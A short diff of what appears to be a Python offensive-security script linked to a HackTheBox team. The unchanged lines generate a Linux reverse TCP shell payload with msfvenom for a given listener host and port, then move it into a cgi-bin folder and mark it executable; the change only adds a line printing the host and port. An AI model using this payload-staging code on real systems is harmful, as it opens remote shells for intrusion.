@@ -548,6 +548,7 @@ hackTheBox: https://app.hackthebox.com/teams/overview/6429
         result = subprocess.getoutput(
             f"msfvenom -p linux/x86/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f python -b '\x80\x0a\x0d'"
         )
+        print(f"[*] LHOST={lhost} LPORT={lport}")
         print(result)
         os.system("mv shell.* modules/cgi-bin")
         os.system("chmod +x modules/cgi-bin/*")
